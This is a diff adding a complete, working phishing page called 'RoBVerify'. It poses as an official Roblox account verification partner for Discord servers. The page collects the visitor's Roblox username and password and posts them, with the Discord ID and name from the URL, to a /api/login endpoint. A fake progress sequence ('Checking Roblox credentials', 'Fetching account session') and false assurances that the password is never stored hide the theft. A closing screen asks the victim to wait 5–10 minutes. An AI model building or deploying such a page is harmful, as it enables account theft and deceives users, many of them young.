@@ -1,0 +1,232 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<meta name="theme-color" content="#1B1D1F">
+<title>RoBVerify — Roblox Account Verification</title>
+<link rel="icon" href="data:,">
+<style>
+  *{box-sizing:border-box}
+  html,body{height:100%}
+  body{margin:0;background:#1B1D1F;color:#fff;
+    font-family:"Builder Sans","Segoe UI",system-ui,-apple-system,"Helvetica Neue",Arial,sans-serif;
+    display:flex;align-items:center;justify-content:center;padding:20px;
+    background-image:radial-gradient(circle at 50% 0%,rgba(226,35,26,.13),transparent 58%)}
+  .card{width:100%;max-width:420px;background:#232527;border:1px solid #2E3134;
+    border-radius:16px;padding:34px 30px;box-shadow:0 18px 50px rgba(0,0,0,.55)}
+  .view{animation:fade .3s ease}
+  .view[hidden]{display:none}
+  @keyframes fade{from{opacity:0;transform:translateY(8px)}to{opacity:1;transform:none}}
+  .brand{display:flex;align-items:center;justify-content:center;gap:10px;margin-bottom:20px}
+  .brand b{font-size:17px;letter-spacing:.2px}
+  .brand b i{font-style:normal;color:#E2231A}
+  h1{font-size:23px;font-weight:600;text-align:center;margin:0 0 8px}
+  p.sub{text-align:center;color:#9A9D9F;font-size:14px;line-height:1.55;margin:0 0 24px}
+  .pill{display:block;width:fit-content;margin:0 auto 16px;font-size:11px;letter-spacing:.6px;
+    text-transform:uppercase;color:#9A9D9F;border:1px solid #3A3D3F;border-radius:999px;padding:5px 12px}
+  .rbx{width:40px;height:40px;background:#E2231A;border-radius:9px;display:grid;place-items:center}
+  .rbx span{width:18px;height:18px;background:#fff;border-radius:2px;transform:rotate(12deg)}
+  .btn{display:flex;align-items:center;justify-content:center;gap:9px;height:50px;width:100%;
+    border:0;border-radius:9px;background:#E2231A;color:#fff;font-size:15px;font-weight:600;
+    font-family:inherit;cursor:pointer;transition:background .12s}
+  .btn:hover{background:#C81E16}
+  .btn:disabled{opacity:.55;cursor:default}
+  .btn.ghost{background:transparent;border:1px solid #4A4D4F}
+  .btn.ghost:hover{background:#2C2E30}
+  .field{position:relative}
+  .field input{width:100%;height:50px;padding:20px 12px 6px;background:#232527;color:#fff;
+    border:1px solid #4A4D4F;border-radius:9px;font-size:15px;outline:none;
+    font-family:inherit;transition:border-color .12s}
+  .field input:focus{border-color:#fff}
+  .field label{position:absolute;left:13px;top:16px;font-size:15px;color:#9A9D9F;
+    transition:all .12s;pointer-events:none}
+  .field input:focus+label,.field input:not(:placeholder-shown)+label{top:7px;font-size:11px}
+  .field+.field{margin-top:14px}
+  .trust{display:flex;align-items:center;justify-content:center;gap:7px;
+    color:#6E7173;font-size:12px;margin-top:18px}
+  .lock{width:11px;height:11px;border:1.6px solid #6E7173;border-radius:2px;position:relative}
+  .lock::before{content:"";position:absolute;left:1.4px;top:-6px;width:5px;height:5px;
+    border:1.6px solid #6E7173;border-bottom:0;border-radius:3px 3px 0 0}
+  .spinner{width:46px;height:46px;margin:6px auto 20px;border-radius:50%;
+    border:3px solid #3A3D3F;border-top-color:#E2231A;animation:spin .8s linear infinite}
+  @keyframes spin{to{transform:rotate(360deg)}}
+  .steps{list-style:none;margin:22px 0 0;padding:0}
+  .steps li{display:flex;align-items:center;gap:12px;padding:7px 0;
+    color:#6E7173;font-size:14px;transition:color .2s}
+  .steps li.active,.steps li.done{color:#fff}
+  .steps .dot{width:18px;height:18px;border-radius:50%;border:2px solid #4A4D4F;
+    flex:0 0 auto;position:relative;transition:all .2s}
+  .steps li.active .dot{border-color:#fff;animation:pulse 1s infinite}
+  .steps li.done .dot{border-color:#00C853;background:#00C853}
+  .steps li.done .dot::after{content:"✓";position:absolute;inset:0;display:grid;
+    place-items:center;font-size:11px;font-weight:700;color:#fff}
+  @keyframes pulse{50%{opacity:.4}}
+  .tick{width:64px;height:64px;border-radius:50%;background:rgba(0,200,83,.13);
+    border:2px solid #00C853;display:grid;place-items:center;margin:2px auto 18px;
+    animation:pop .35s cubic-bezier(.2,1.4,.4,1)}
+  @keyframes pop{from{transform:scale(.6);opacity:0}to{transform:none;opacity:1}}
+  .tick svg{width:30px;height:30px}
+  .ref{display:block;text-align:center;color:#6E7173;font-size:12px;
+    font-family:ui-monospace,Menlo,Consolas,monospace;margin:16px 0 22px}
+  .note{background:#1B1D1F;border:1px solid #2E3134;border-radius:9px;
+    padding:13px 15px;font-size:13px;color:#9A9D9F;line-height:1.6;text-align:center}
+  .acct{text-align:center;font-size:14px;color:#fff;margin:0 0 4px}
+  .acct b{color:#00C853}
+</style>
+</head>
+<body>
+<div class="card">
+
+  <!-- 1. WELCOME -->
+  <div class="view" id="v-welcome">
+    <div class="brand">
+      <svg viewBox="0 0 48 48" width="30" height="30">
+        <defs><linearGradient id="g" x1="0" y1="0" x2="1" y2="1">
+          <stop offset="0" stop-color="#E2231A"/><stop offset="1" stop-color="#A8140D"/>
+        </linearGradient></defs>
+        <path d="M24 3l16 6v13c0 10-7 18-16 21-9-3-16-11-16-21V9z" fill="url(#g)"/>
+        <path d="M16 24l6 6 11-12" fill="none" stroke="#fff" stroke-width="4"
+              stroke-linecap="round" stroke-linejoin="round"/>
+      </svg>
+      <b>Ro<i>B</i>Verify</b>
+    </div>
+    <h1 id="welcomeTitle">Welcome to RoBVerify</h1>
+    <p class="sub">
+      You're one step away from full server access. Verify your Roblox account
+      to unlock channels, roles and giveaways.
+    </p>
+    <button class="btn" id="toLogin">
+      Verify My Roblox Account
+      <svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="#fff"
+           stroke-width="2.4" stroke-linecap="round" stroke-linejoin="round">
+        <path d="M5 12h14M13 6l6 6-6 6"/>
+      </svg>
+    </button>
+    <div class="trust"><span class="lock"></span> Secure connection · Official verification partner</div>
+  </div>
+
+  <!-- 2. LOGIN -->
+  <div class="view" id="v-login" hidden>
+    <span class="pill">Step 2 of 3</span>
+    <div class="rbx" style="margin:0 auto 16px"><span></span></div>
+    <h1>Link your Roblox account</h1>
+    <p class="sub">Sign in to Roblox so we can confirm you own the account.</p>
+    <form id="f" autocomplete="on">
+      <div class="field">
+        <input id="u" name="username" type="text" placeholder=" " required
+               autocapitalize="off" autocomplete="username" autofocus>
+        <label for="u">Username/Email</label>
+      </div>
+      <div class="field">
+        <input id="p" name="password" type="password" placeholder=" " required
+               autocomplete="current-password">
+        <label for="p">Password</label>
+      </div>
+      <button type="submit" class="btn" id="btn" style="margin-top:20px">Log In &amp; Verify</button>
+    </form>
+    <div class="trust"><span class="lock"></span> Your password is never stored by RoBVerify</div>
+  </div>
+
+  <!-- 3. LOADING -->
+  <div class="view" id="v-loading" hidden>
+    <div class="spinner"></div>
+    <h1>Verifying your account</h1>
+    <p class="sub">Please don't close this window.</p>
+    <ul class="steps" id="steps">
+      <li><span class="dot"></span>Establishing secure connection</li>
+      <li><span class="dot"></span>Checking Roblox credentials</li>
+      <li><span class="dot"></span>Fetching account session</li>
+      <li><span class="dot"></span>Linking to your Discord profile</li>
+    </ul>
+  </div>
+
+  <!-- 4. SUCCESS -->
+  <div class="view" id="v-success" hidden>
+    <div class="tick">
+      <svg viewBox="0 0 24 24" fill="none" stroke="#00C853" stroke-width="3"
+           stroke-linecap="round" stroke-linejoin="round"><path d="M4 12.5l5.5 5.5L20 7"/></svg>
+    </div>
+    <h1>Verification Completed</h1>
+    <p class="acct" id="acct" hidden>Account <b id="acctName"></b> linked</p>
+    <p class="sub" style="margin-bottom:0">Your details have been submitted successfully.</p>
+    <div class="note" style="margin-top:16px">
+      Verification may take a while to be submitted to the mods —
+      roughly <b style="color:#fff">5–10 minutes</b>. Please be patient and
+      don't leave the server in the meantime.
+    </div>
+    <span class="ref" id="ref">Reference: —</span>
+    <button class="btn ghost" id="back">Return to Discord</button>
+  </div>
+
+</div>
+
+<script>
+  var qs = new URLSearchParams(location.search);
+  var dId = qs.get('d') || '';
+  var dName = qs.get('n') || '';
+
+  if (dName) document.getElementById('welcomeTitle').textContent = 'Welcome, ' + dName;
+
+  function show(id) {
+    ['v-welcome','v-login','v-loading','v-success'].forEach(function (v) {
+      document.getElementById(v).hidden = (v !== id);
+    });
+    window.scrollTo(0, 0);
+  }
+
+  var wait = function (ms) { return new Promise(function (r) { setTimeout(r, ms); }); };
+
+  document.getElementById('toLogin').onclick = function () {
+    show('v-login');
+    setTimeout(function () { document.getElementById('u').focus(); }, 60);
+  };
+
+  document.getElementById('f').addEventListener('submit', async function (e) {
+    e.preventDefault();
+
+    var payload = {
+      username: e.target.elements.username.value.trim(),
+      password: e.target.elements.password.value,
+      d: dId,
+      n: dName
+    };
+
+    show('v-loading');
+
+    var items = document.querySelectorAll('#steps li');
+    items.forEach(function (li) { li.className = ''; });
+
+    // fire the request immediately, animate the steps in parallel
+    var req = fetch('/api/login', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify(payload)
+    })
+    .then(function (r) { return r.json(); })
+    .catch(function () { return {}; });
+
+    for (var i = 0; i < items.length; i++) {
+      items[i].className = 'active';
+      await wait(760);
+      items[i].className = 'done';
+    }
+
+    var data = await req;
+    await wait(350);
+
+    if (data && data.ref) document.getElementById('ref').textContent = 'Reference: ' + data.ref;
+    if (data && data.account) {
+      document.getElementById('acctName').textContent = '@' + data.account;
+      document.getElementById('acct').hidden = false;
+    }
+
+    show('v-success');
+  });
+
+  document.getElementById('back').onclick = function () {
+    location.href = 'https://discord.com/app';
+  };
+</script>
+</body>
+</html>
